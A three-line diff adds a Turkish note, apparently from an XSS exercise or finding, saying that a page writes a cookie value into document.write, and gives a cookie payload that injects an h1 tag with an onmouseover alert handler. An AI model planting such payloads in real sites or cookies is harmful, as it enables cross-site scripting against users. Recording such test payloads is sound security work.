@@ -1,0 +1,3 @@
+cookiden aldığı değeri document.write içerisine koyuyor 
+
+cookie payload =  a<h1 onmouseover="alert()">naber</h1>
